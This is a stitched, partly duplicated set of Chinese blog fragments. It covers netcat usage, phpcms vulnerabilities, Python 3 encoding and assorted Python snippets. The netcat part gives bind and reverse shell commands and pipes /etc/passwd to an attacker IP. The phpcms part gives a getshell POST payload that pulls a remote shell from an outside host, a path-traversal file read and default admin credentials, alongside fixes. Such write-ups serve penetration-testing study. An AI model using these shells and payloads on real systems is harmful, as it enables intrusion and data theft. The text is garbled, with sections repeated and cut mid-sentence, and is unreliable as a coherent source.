-->\n　　首先我的理由是安全攻防永远是此消彼长，技术从未停滞过，安全技术永远领先于安全工具，因此只会使用工具，有时会使渗透测试工作很难开展下去，因为防护手段日益更新，而攻击技术却只能依赖滞后的工具，这样的测试效果可见一斑。其次是目前市面上强大的渗透工具，都需要一定的使用基础，绝非傻瓜式的操作，想要用好一款神器，也并非易事。综上所述，我个人认为目前渗透测试工作的难度反而会更大，并且随着国家企业对安全的重视，渗透测试从业者肩上的担子也只会更重。\n　　开篇扯了半天蛋无非是想引出本系列的主题——渗透神器，之所以想要介绍记录渗透测试中使用的神器，是因为*工欲善其事，必先利其器*，仅此而已！\n　　本篇作为此系列第一篇，将介绍一款渗透界经久不衰的神器，有瑞士军刀美誉的NC。本篇所记内容大部分来自互联网，如觉内容老套可自行绕道，本人尽量全方面记录NC的使用方法，全当个人查询之用，轻喷即可。\n\n### nc Introduce\nnc全称netcat,是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据，功能强大。\n\n### nc Install\nlinux/mac上默认安装nc，可在命令行下输入nc -h查看。\nwindows下可下载nc.exe工具使用。\n\n### nc Usage\n\n#### 基本用法\n可以输入nc -h查看帮助：\n> -h 查看帮助信息 \n-d 后台模式 \n-g gateway source-routing hop point[s], up to 8\n-G num source-routing pointer: 4, 8, 12, ...\n-e prog程序重定向，一但连接就执行［危险］ \n-i secs延时的间隔 \n-l 监听模式，用于入站连接 \n-L 监听模式，连接天闭后仍然继续监听，直到CTR+C \n-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)\n-o film记录16进制的传输 \n-p[空格]端口 本地端口号 \n-s addr 本地源地址\n-r 随机本地及远程端口 \n-t 使用Telnet交互方式 \n-u UDP模式 \n-v 详细输出，用-vv将更详细 \n-w 数字 timeout延时间隔 \n-z 将输入，输出关掉（用于扫锚时）\n\n#### PortScan(端口扫描)\n基本tcp扫描：\n```bash\nnc -vv ip port\n例：nc -vv 192.168.1.1 5000 扫描192.168.1.1的tcp 5000端口\n```\n设置延时，指定端口扫描：\n```bash\nnc -vv -w secs ip port-port\n例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。\n```\n#### 建立连接\n##### 正向连接\n目标监听一个端口：\n```bash\nnc -l -p port -e cmd.exe //windows\nnc -l -p port -e /bin/sh //linux\n```\n本机去连接此端口：\n```bash\nnc ip port \n```\n##### 反向链接\n本机监听一个端口：\n```bash\nnc -vv -l -p port\n```\n目标连接此端口：\n```bash\nnc -e cmd.exe ip port //windows\nnc -e /bin/sh ip port //linux\n```\n#### 传送文件\n##### 目标机上下载文件\n```bash\nvictim machine:\nnc attack_ip port <  /etc/passwd\nattacker machine:\nnc -d -l -p  port  >  tmp\n```\n实例：\n本机作为目标机，因为是内网ip，模拟现实情况，113.214.238.185为攻击机，现在就是要从目标机上下载文件到攻击机上。\n目标机：nc.exe 113.214.238.185 9999 < H:\\test.txt 将目标机H盘下test.txt文件传输到攻击机9999端口上\n攻击机：nc.exe -d -l -p 9999 > test.txt 将本机9999端口传输过来的文件重命名为test.txt\n\n##### 上传文件至目标机\n```bash\nattacker machine:\nnc -d -l -p port < tmp\nvictim machine:\nnc attack_ip port > tmp\n```\n实例：\n攻击机：nc -d -l -p 9990 < test2.txt\n目标机：nc 113.214.238.185 9990 > test2.txt\n\n#### 端口数据抓包\n```bash\nnc -vv -w 2 -o test.txt thief.one 80 21-15\n```\n#### 自定义\n配合|<等命令，可无限放大NC的功能。\n\n##### 加密传输的数据\n服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt\n客户端：$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567\n\n##### 目录传输\n目标机：$tar -cvf – dir_name | nc -l 1567\n攻击机：$nc -n 10.0.0.2 1567 | tar -xvf -\n\n##### 命令记录\n```bash\nnc -vv victim_ip port < path\\file.cmd\n```\n##### 搭建蜜罐\n* nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 \n* nc -L -p 80 > c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt \n* nc -L -p 80 < c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 \n* type.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 \n\n### 类nc工具\n* ncat 安装nmap后默认安装ncat，用法于nc类似。\n* [Pyshell](http://thief.one/2016/09/05/PyShell-%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/) 致敬nc的一款后门shell工具。\n\n###

nc Introduce\nnc全称netcat,是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据，功能强大。\n\n### nc Install\nlinux/mac上默认安装nc，可在命令行下输入nc -h查看。\nwindows下可下载nc.exe工具使用。\n\n### nc Usage\n\n#### 基本用法\n可以输入nc -h查看帮助：\n> -h 查看帮助信息 \n-d 后台模式 \n-g gateway source-routing hop point[s], up to 8\n-G num source-routing pointer: 4, 8, 12, ...\n-e prog程序重定向，一但连接就执行［危险］ \n-i secs延时的间隔 \n-l 监听模式，用于入站连接 \n-L 监听模式，连接天闭后仍然继续监听，直到CTR+C \n-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)\n-o film记录16进制的传输 \n-p[空格]端口 本地端口号 \n-s addr 本地源地址\n-r 随机本地及远程端口 \n-t 使用Telnet交互方式 \n-u UDP模式 \n-v 详细输出，用-vv将更详细 \n-w 数字 timeout延时间隔 \n-z 将输入，输出关掉（用于扫锚时）\n\n#### PortScan(端口扫描)\n基本tcp扫描：\n```bash\nnc -vv ip port\n例：nc -vv 192.168.1.1 5000 扫描192.168.1.1的tcp 5000端口\n```\n设置延时，指定端口扫描：\n```bash\nnc -vv -w secs ip port-port\n例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。\n```\n#### 建立连接\n##### 正向连接\n目标监听一个端口：\n```bash\nnc -l -p port -e cmd.exe //windows\nnc -l -p port -e /bin/sh //linux\n```\n本机去连接此端口：\n```bash\nnc ip port \n```\n##### 反向链接\n本机监听一个端口：\n```bash\nnc -vv -l -p port\n```\n目标连接此端口：\n```bash\nnc -e cmd.exe ip port //windows\nnc -e /bin/sh ip port //linux\n```\n#### 传送文件\n##### 目标机上下载文件\n```bash\nvictim machine:\nnc attack_ip port <  /etc/passwd\nattacker machine:\nnc -d -l -p  port  >  tmp\n```\n实例：\n本机作为目标机，因为是内网ip，模拟现实情况，113.214.238.185为攻击机，现在就是要从目标机上下载文件到攻击机上。\n目标机：nc.exe 113.214.238.185 9999 < H:\\test.txt 将目标机H盘下test.txt文件传输到攻击机9999端口上\n攻击机：nc.exe -d -l -p 9999 > test.txt 将本机9999端口传输过来的文件重命名为test.txt\n\n##### 上传文件至目标机\n```bash\nattacker machine:\nnc -d -l -p port < tmp\nvictim machine:\nnc attack_ip port > tmp\n```\n实例：\n攻击机：nc -d -l -p 9990 < test2.txt\n目标机：nc 113.214.238.185 9990 > test2.txt\n\n#### 端口数据抓包\n```bash\nnc -vv -w 2 -o test.txt thief.one 80 21-15\n```\n#### 自定义\n配合|<等命令，可无限放大NC的功能。\n\n##### 加密传输的数据\n服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt\n客户端：$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567\n\n##### 目录传输\n目标机：$tar -cvf – dir_name | nc -l 1567\n攻击机：$nc -n 10.0.0.2 1567 | tar -xvf -\n\n##### 命令记录\n```bash\nnc -vv victim_ip port < path\\file.cmd\n```\n##### 搭建蜜罐\n* nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 \n* nc -L -p 80 > c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt \n* nc -L -p 80 < c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 \n* type.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 \n\n### 类nc工具\n* ncat 安装nmap后默认安装ncat，用法于nc类似。\n* [Pyshell](http://thief.one/2016/09/05/PyShell-%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/) 致敬nc的一款后门shell工具。\n\n###

class=\"blockquote-center\">终是谁使弦断，花落肩头，恍惚迷离</blockquote>\n　　之前一直在使用python2.x版本，其中的编码问题颇为头疼，根据使用经验以及实验测试，前些日子总结了一些关于python2.x的编码问题，会在本文最后给出地址。本篇主要描述python3中的编码，如果称Python2的编码为殇，那么Python3的编码就应该为美了。\n<!--more

bytes/str/unicode区别\n更新于2017年5月2号\n#### python3的bytes与str\n　　bytes表示字符的原始8位值，str表示Unicode字符。将unicode字符表示为二进制数据（原始8位值），最常见的编码方式就是UTF-8。python2与3中的unicode字符没有和特定的二进制编码相关联，因此需要使用encode方法。\n　　在python3中bytes与str是绝对不会等价的，即使字符内容为\"\"，因此在传入字符序列时必须注意其类型。\n#### python2的str与unicode\n　　str表示字符的原始8位值，unicode表示Unicode字符。\n　　在python2中，如果str只包含7位ASCII字符（英文字符），那么unicode与str实例类似于同一种类型（等价的），那么在这种情况下，以下几种操作是正常的：\n\n* 可以用+号连接str与unicode\n* 可以用=与!=来判断str与unicode\n* 可以用’%s’来表示Unicode实例\n\n### 系统以及源代码编码\n3.x已经把源代码编码以及系统编码从ascii都变成了utf-8，避免了中文报错。\n```bash\n>>> import sys\n>>> print(sys.getdefaultencoding())\nutf-8\n>>> print(sys.getfilesystemencoding())\nutf-8\n>>>\n```\n其次，我们可以看到我们定义的a为str（相当于2.x中unicode），而它在windows控制台输出时也没有因为编码问题而报错。\n```bash\n>>> a=\"你好\"\n>>>print(a)\n你好\n```\n\n### 字符串编码\n```bash\n>>> a=\"你好\"\n>>> print(type(a))\n<class 'str'>\n>>> b=a.encode(\"utf-8\")\n>>> print(type(b))\n<class 'bytes'>\n>>>\n```\n我们可以看到，3.x中的str格式类似于2.x中的unicode，而2.x中的str相当于3.x中的bytes.\n\n### 网页编码\n![](/upload_image/20170418/1.png)\n结果：\n![](/upload_image/20170418/2.png)\n返回的是bytes格式的，只要decode转化为str就ok了。\n\n### 文件编码\n![](/upload_image/20170418/3.png)\n结果：从文件中读取出来的是str（2.x中的unicode），因此不用转码。\n#### open函数\n注意python2中open句柄是str(原始二进制)的，而python3中是str(unicode字符)，因此一下代码在python2中正常，在python3中会报错：\n```bash\nwith open(\"test\",\"w\") as w:\n    w.write(\"123\")\n```\n因为python3中，要求传入的值为str类型，而不是bytes类型，open函数自带encoding方法。\n解决方法：\n```bash\nwith open(\"test\",\"wb\") as w:\n    w.write(\"123\")\n```\n同理，read函数也是一样，写成rb，就可以兼容2与3了。\n\n###

class=\"blockquote-center\">终是谁使弦断，花落肩头，恍惚迷离</blockquote><br>　　之前一直在使用python2.x版本，其中的编码问题颇为头疼，根据使用经验以及实验测试，前些日子总结了一些关于python2.x的编码问题，会在本文最后给出地址。本篇主要描述python3中的编码，如果称Python2的编码为殇，那么Python3的编码就应该为美了。<br>","more":"<br>　　我在python2编码之殇一文的最后介绍过，想要解决python2中的编码问题，最直接有效的方法就是将所有外部的字符串转变为unicode格式，再在python内部了流转。python3正是在这方面做了很大的优化。<br>　　python3中也有2种编码格式，分别为str与byte，这里的str相当于2中的unicode，byte相当于2中的str。再者python3将python源代码编码从ascii改成了utf-8，从外部接收的编码自动转化成了str(2中的unicode)，大大减少产生编码异常的点。与2一样，3中的编码原则就是将外部接收的字符编码成str（unicode字符），输出时再编码成bytes编码。光说没用，我用实验证明。</p>\n<h3

href=\"#python3的bytes与str\" class=\"headerlink\" title=\"python3的bytes与str\"></a>python3的bytes与str</h4><p>　　bytes表示字符的原始8位值，str表示Unicode字符。将unicode字符表示为二进制数据（原始8位值），最常见的编码方式就是UTF-8。python2与3中的unicode字符没有和特定的二进制编码相关联，因此需要使用encode方法。<br>　　在python3中bytes与str是绝对不会等价的，即使字符内容为””，因此在传入字符序列时必须注意其类型。</p>\n<h4 id=\"python2的str与unicode\"><a href=\"#python2的str与unicode\" class=\"headerlink\"

exp漏洞利用脚本\nexp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/\nexp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html\n漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A\n\n#### 漏洞修复方案\n* 去掉modules\\content\\down.php文件\n\n### phpcms注册页面getshell漏洞\n\n* 存在的漏洞：php远程文件包含、任意文件上传\n* 漏洞利用点：phpcms注册页面\n* 利用类型：http post请求导致任意文件上传+getshell\n\n#### Post Poc\n```bash\nsiteid=1&modelid=11&username=newbie&password=newbie&email=newbie@qq.com&info[content]=<img src=http://shhdmqz.com/newbie.txt?.php#.jpg>&dosubmit=1&protocol=\n```\n注意：*http://shhdmqz.com/newbie.txt*为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。\n\n#### 漏洞利用细节\n　　访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《*img src=http://shhdmqz.com/newbie.txt?.php#.jpg*》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。\n\n#### exp漏洞利用脚本\nexp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/\n\n#### 漏洞修复方案\n\n暂时性修复：\n\n* 关闭注册页面\n* 关闭远程文件包含，即关闭allow_url_fopen\n\n彻底性修复：\n修改phpcms/libs/classes/attachement.class.php文件中的download函数在\nforeach($remotefileurls as $k=>$file)循环中，大约是167行左右的位置，将\n```bash\nif(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);\n```\n修改成\n```bash\n$filename = fileext($k);\n```\n\n关于文件包含漏洞，可参考：[文件包含漏洞](http://thief.one/2017/04/10/2/)\n\n### 任意文件读取漏洞\n```bash\nindex.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=..\\/..\\/caches/error_log.php \n```\n### phpcms敏感信息\n\n* 默认账号密码：phpcms/phpcms\n* 默认后台： http://www.xx.com/index.php?m=admin&c=index&a=login&pc_hash=   \n* 会员中心地址：index.php?m=member&c=index&a=login

exp漏洞利用脚本\nexp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/\nexp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html\n漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A\n\n#### 漏洞修复方案\n* 去掉modules\\content\\down.php文件\n\n### phpcms注册页面getshell漏洞\n\n* 存在的漏洞：php远程文件包含、任意文件上传\n* 漏洞利用点：phpcms注册页面\n* 利用类型：http post请求导致任意文件上传+getshell\n\n#### Post Poc\n```bash\nsiteid=1&modelid=11&username=newbie&password=newbie&email=newbie@qq.com&info[content]=<img src=http://shhdmqz.com/newbie.txt?.php#.jpg>&dosubmit=1&protocol=\n```\n注意：*http://shhdmqz.com/newbie.txt*为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。\n\n#### 漏洞利用细节\n　　访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《*img src=http://shhdmqz.com/newbie.txt?.php#.jpg*》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。\n\n#### exp漏洞利用脚本\nexp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/\n\n#### 漏洞修复方案\n\n暂时性修复：\n\n* 关闭注册页面\n* 关闭远程文件包含，即关闭allow_url_fopen\n\n彻底性修复：\n修改phpcms/libs/classes/attachement.class.php文件中的download函数在\nforeach($remotefileurls as $k=>$file)循环中，大约是167行左右的位置，将\n```bash\nif(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);\n```\n修改成\n```bash\n$filename = fileext($k);\n```\n\n关于文件包含漏洞，可参考：[文件包含漏洞](http://thief.one/2017/04/10/2/)\n\n### 任意文件读取漏洞\n```bash\nindex.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=..\\/..\\/caches/error_log.php \n```\n### phpcms敏感信息\n\n* 默认账号密码：phpcms/phpcms\n* 默认后台： http://www.xx.com/index.php?m=admin&c=index&a=login&pc_hash=   \n* 会员中心地址：index.php?m=member&c=index&a=login

class=\"blockquote-center\">叶落下了思念，风摇曳那些岁岁年年</blockquote>\n　　本文用作记录，在使用python过程中遇到的一些奇技淫巧，有些代码是本人所写，有些则是python内置函数，有些则取之互联网。在此记录，只为备份以及遗忘时方便查找。\n　　本文将会持续更新，内容仅限记录一些常用好用却又永远记不住的代码或者模块。\n<!--more -->\n\n### 控制台操作\n控制台不闪退\n```bash\nos.system('pause') \n```\n获取控制台大小\n```bash\nrows, columns = os.popen('stty size', 'r').read().split()\n```\n#### 输入输出控制\n解决输入提示中文乱码问题\n```bash\nraw_input(unicode('请输入文字','utf-8').encode('gbk'))\n```\n格式化输出\n```bash\nprint a.prettify()\n```\n接受多行输入\n```bash\ntext=\"\"\nwhile 1:\n    data=raw_input(\">>\")\n    if data.strip()==\"stop\":\n        break\n    text+=\"%s\\n\" % data\nprint text\n---------------------------\n>>1\n>>2\n>>3\n>>stop\n1\n2\n3\n```\n同行输出\n```bash\nPrint '%s' % a,\nPrint '%s \\r' % a\n```\n标准输入输出\n```bash\nsys.stdout.write(\"input\") 标准输入\nsys.stdout.flush() 刷新缓冲区\n```\nprint的功能与sys.stdout.write类似，因为2.x中print默认就是将输出指定到标准输出中（sys.stdout)。\n#### 颜色控制\n控制台颜色控制(适用于windows)\n```bash\nWConio.textcolor(WConio.YELLOW)\nprint \"yellow\"\nWConio.textcolor(WConio.BLUE)\nprint \"blue\"\n```\n输出颜色控制(全平台)\n```bash\nred = '\\033[1;31m'\ngreen = '\\033[1;32m'\nyellow = '\\033[1;33m'\nwhite = '\\033[1;37m'\nreset = '\\033[0m’\n\nprint red+\"color is red\"+reset\nprint green+\"color is green\"+reset\n```\n#### 进度条控制\n方案一\n```bash\nfrom __future__ import division\nimport sys,time\nj = '#'\nfor i in range(1,61):\n    j += '#'\n    sys.stdout.write(str(int((i/60)*100))+'%  ||'+j+'->'+\"\\r\")\n    sys.stdout.flush()\n    time.sleep(0.1)\n```\n方案二\n```bash\nimport sys\nimport time\nfor i in range(1,61):\n    sys.stdout.write('#'+'->'+\"\\b\\b\")\n    sys.stdout.flush()\n    time.sleep(0.5)\n```\n方案三\n```bash\nfrom progressbar import *\nimport time\nimport os\nrows, columns = os.popen('stty size', 'r').read().split() #获取控制台size    \nconsole_width=int(columns)\ntotal = 10\nprogress = ProgressBar()\n\ndef test():\n    '''\n    进度条函数，记录进度\n    '''\n    for i in progress(range(total)):\n        test2()\n\ndef test2():\n    '''\n    执行函数，输出结果\n    '''\n    content=\"nMask'Blog is http://thief.one\"\n    sys.stdout.write(\"\\r\"+content+\" \"*(console_width-len(content)))\n    time.sleep(1)\n    sys.stdout.flush()\n\ntest()\n\n```\n更多高级用法可以使用progressbar模块。\n### 系统操作\n#### 系统信息\n获取python安装路径\n```bash\nfrom distutils.sysconfig import get_python_lib\nprint get_python_lib\n```\n获取当前python版本\n```bash\nsys.version_info\nsys.version\n```\n获取当前时间\n```bash\nc=time.ctime()\n#自定义格式输出\nISOTIMEFORMAT=’%Y-%m-%d %X’\ntime.strftime( ISOTIMEFORMAT, time.localtime()

'r').read().split()\n#python3以后存在可以使用os\nos.get_termial_size()\n```\n#### 退出程序\n\n* return：返回函数的值，并退出函数。\n* exit()：直接退出。\n* sys.exit(): 引发一个SystemExit异常，若没有捕获错误，则python程序直接退出；捕获异常后，可以做一些额外的清理工作。\n* sys.exit(0):为正常退出，其他（1-127）为不正常，可抛异常事情供捕获。（一般用于主线程中退出程序）\n* os._exit(0): 直接退出python程序，其后的代码也不会执行。（一般用于线程中退出程序）\n\n### 网络操作\n域名解析为ip\n```bash\nip= socket.getaddrinfo(domain,'http')[0][4][0]\n```\n获取服务器版本信息\n```bash\nsUrl = 'http://www.163.com'\nsock = urllib2.urlopen(sUrl)\nsock.headers.values()\n```\n### 文件操作\nopen函数,使用wb、rb代替w、r\n```bash\nwith open(\"test.txt\",\"wr\") as w:\n    w.write(\"test\")\n```\n这种写法可以兼容python2/3。\n输出一个目录下所有文件名称\n```bash\ndef search(paths):\n    if os.path.isdir(paths):  #如果是目录\n          files=os.listdir(paths)

“[]“\n”*”匹配0个或多个字符；\n”?”匹配单个字符；\n”[]“匹配指定范围内的字符，如：[0-9]匹配数字。\n```\n查找指定名称的文件夹的路径\n```bash\ndef search(paths,file_name,tag,lists):\n    if os.path.isdir(paths):  #如果是目录\n        if file_name==tag:    #如果目录名称为tag\n            lists.append(paths) #将该路径添加到列表中\n        else:                 #如果目录名称不为tag\n            try:\n                files_list=os.listdir(paths)  #列出目录中所有的文件\n                for

         pass\n\n    elif os.path.isfile(paths): #如果是文件\n        pass\n\n    return lists\n```\n### 数据操作\n判断数据类型\n```bash\nisinstance(\"123\",(int,long,float,complex)\n```\n#### 字符串(string)\n去掉小数点后面的数字\n```bash\na=1.21311\nb=Int(math.floor(a))\n```\n字符串倒置\n```bash\n>>> a =  \"codementor\"\n>>> a[::-1]\n```\n字符串首字母变大写\n```bash\ninfo = 'ssfef'\nprint info.capitalize()\nprint info.title()\n```\n返回一个字符串居中，并使用空格填充至长度width的新字符串。\n```bash\n\"center string\".center(width) #width设置为控制台宽度，可控制输出的字符串居中。\n```\n列举所有字母\n```bash\nprint string.ascii_uppercase 所有大写字母\nprint string. ascii_lowercase 所有小写字母\nprint string.ascii_letters 所有字母（包括大小写）\n```\n#### 列表(list)\n列表去重\n```bash\nids = [1,4,3,3,4,2,3,4,5,6,1]\nids = list(set(ids))\n```\n判断列表为空\n```bash\na=[]\nif not

6]\n```\n列表内元素相加\n```bash\na=[1,2,3]（数字）\nsum(a)\n```\n产生a-z的字符串列表\n```bash\nmap(chr,range(97,123))\n```\n列表复制\n```bash\na=[1,2,3]\nb=a\n当对b进行操作时，会影响a的内容，因为共用一个内存指针，b=a[:] 这样就是单独复制一份了。\n```\n#### 列表推导\nif+else配合列表解析\n```bash\n[i if i >5 else -i for i in range(10)]\n```\n多层嵌套列表\n```bash\na=[[1,2],[3,4]]\nb=[for j in i for i in a]\nprint

key=operator.itemgetter(1),reverse=True) ##字典排序,reverse=True由高到低，itemgetter(1)表示按值排序，为0表示按key排序。\n```\n字典值判断\n```bash\nb={\"a\":1}\na=b.get(\"a\",\"\")  #如果不存在a，则返回””\nc=a if a else 0  #如果存在a，则返回a，不然返回0\n```\n### 模块操作\n导入模块时，设置只允许导入的属性或者方法。\n```bash\nfb.py:\n-----------------------\n__all__=[\"a\",\"b\"]\na=\"123\"\nc=\"2345\"\ndef b():\n    print “123”\n-----------------------\nfrom fb import *\n可以导入__all__内定义的变量，a跟b()可以导入，c不行。如果不定义__all__则所有的都可以导入。\n```\n导入上级目录下的包\n```bash\nsys.path.append(\"..\")\nfrom spider.spider_ import spider_\n```\n导入外部目录下的模块\n```bash\n需要在目标目录下创建__init__.py文件，内容随便。\n```\n增加模块属性\n```bash\n有时候源代码中，我们需要写上自己的名字以及版本介绍信息，可以用__name__的方式定义。\na.py:\n#! -*- coding:utf-8 -*-\n__author__=\"nMask\"\n```\n然后当我们导入a这个模块的时候，可以输出dir(a)看看\n```bash\n>>> import p\n>>> print dir(p)\n['__author__', '__builtins__', '__doc__', '__file__', '__name__', '__package__']\n>>> print p.__author__\nnmask\n```\n动态加载一个目录下的所有模块\n```bash\n目录：\n---test\n   ----a.py\n   ----b.py\n---c.py\nc.py导入test下面的所有模块：\nfor path in [\"test\"]:\n    for i in list(set([os.path.splitext(i)[0] for i in

故事是这样开始的\n　　下午茶时间，某司（司机）扔给了我一个奇怪的字符串，说是帮忙转化成中文，看了看扔过来的这串奇怪字符，原本我是拒绝的，然而还没等我答复他便补充了句：已订好速八，晚上约，并抛了个坏笑的表情（你懂的那种表情），我不明白坏笑是什么意思，但我猜可能有某种特殊的含义，因为对方毕竟是位老司机。没辙，看在睡了几晚的份上，还是决定好好研究下这串代码。\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\n```\n简单分析下这串字符，感觉像是unicode编码的内容，但有觉得少了点啥，于是我便开始了一系列的实验。\n我想弄清楚这串到底是什么东西，首先我对unicode编码的字符串进行了测试，看看其长啥样。\n```bash\n>>> a=u\"你好\"\n>>> a\nu'\\u4f60\\u597d'  #（unicode编码）\n>>> print type(a) \n<type 'unicode'>\n>>> print a\n你好\n```\n　　实验结果表示unicode字符串长这样：u'\\u4f60\\u597d'，但它实际代表的是中文：你好。至于为什么输入a，输出的是unicode字符内容，而print a输出的是str格式的中文：你好，原因想必是python中的print语句会自动将unicode字符转化成str格式。如果您对unicode与string不了解，那么请回到文章开头，移步之前那篇分析编码的文章，我想会对您有帮助。\n　　竟然知道了unicode字符长啥样，那么我们可以排除那个奇怪的字符串并不是unicode字符串了。为啥呢？很明显，因为它前面没有u啊。\n\n　　看到这里，您是不是有点迷糊了呢？虽然它前面没有u（u\"\\u4f60....\"），但是它长得确实很像unicode字符啊。不用着急，接下来让我来好好介绍下*字符串变量编码*　以及*字符串内容编码*　的差异。\n\n*说明：以上两个概念是我自己临时取的，不代表官方解释，如有偏差请谅解*\n\n　　所谓字符串变量编码就是我们平常所说的编码，比如string、unicode，string又包含utf-8、gbk、gb2312等。判断方式很简单，用type函数即可。\n```bash\n>>> a=u\"你好\"\n>>> print type(a) \n<type 'unicode'>\n>>> a=\"你好\"\n>>> print type(a)\n<type 'str'>\n```\n　　我们可以看到，unicode或者string代表的是a这个字符串变量的一种编码格式，跟其内容无关。我们知道定义a=\"test\",那么a是string编码；反之定义a=u\"test\"，a便是unicode编码，那么我想问：test是什么编码的？（这里问的是test，而不是a）\n有人会说，test就是一个普通的字符串，没错它确实是一个字符串，它表示a的内容。那么同理当定义\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\n```\n时，a本身是str格式的字符串，那么\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n内容本身呢？没错，其内容本身是一个unicode编码后的字符串。好了，还是让我们做实验测试吧。\n\n我们先看看被常见的几种编码格式编码后的字符串内容：\n```bash\n>>> a=u\"你好\".encode(\"gbk\")\n>>> a\n'\\xc4\\xe3\\xba\\xc3'  #内容为gbk编码\n>>> a=u\"你好\".encode(\"utf-8\")\n>>> a\n'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'  #内容为utf-8编码\n>>> a=u\"你好\".encode(\"gb2312\")\n>>> a\n'\\xc4\\xe3\\xba\\xc3' #内容为gb2312编码\n>>> a=u\"你好\"\n>>> a\nu'\\u4f60\\u597d'    #内容为unicode编码\n```\n请注意以上几种编码的内容，观察其特点，然后我们再来看下那个奇怪的字符串。\n```bash\n>>> a=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\n>>> a\n'\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4'\n>>> print type(a) \n<type 'str'>\n>>> print a   \n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n>>>\n```\n我们看到变量a是string格式的。\n```bash\n>>> a=u\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" #在前面加个u，将变量a变成unicode\n>>> print type(a) \n<type 'unicode'>\n>>> print a   #相当于a.encode(\"utf-8\")\n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n```\n我们在变量\"\"前面加个u，表示变量a为unicode字符串，其内容为\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n接下print a，发现跟上一步的结果一样，没错，因为print将a从unicode变成了string，而其内容看上去少了一些斜杠。\n```bash\n>>> b=u\"\\u8fdd\\u6cd5\\u8fdd\\u89c4\"\n>>> print type(b) \n<type 'unicode'>\n>>> print b\n违法违规\n>>>\n```\n　　紧接着，我将a的内容，也就是\\u8fdd\\u6cd5\\u8fdd\\u89c4，重新赋值给变量b，此时\"\"也加个u，让其成为unicode格式，然后print b，神奇的一幕发生了，输出的结果竟然转化成中文了。其原因我想是，print语句不仅会将字符串变量a转为成string，也会将其内容转化为string。\n```bash\n>>> a=\"你好\"\n>>> a\n'\\xc4\\xe3\\xba\\xc3'\n>>> a=u\"\\xc4\\xe3\\xba\\xc3\"\n>>> print a\nÄãºÃ\n```\n　　以上例子定义变量a为unicode编码，而其内容为string-utf-8编码，此时当print a时，print语句尝试将a的内容转化为string，但由于其本身就是string编码，因此出现了乱码，反之是可以的。\n```bash\n>>> a=\"你好\"\n>>> a\n'\\xc4\\xe3\\xba\\xc3'\n>>> b=\"\\xc4\\xe3\\xba\\xc3\"\n>>> b.decode(\"gbk\")\nu'\\u4f60\\u597d'\n>>> print 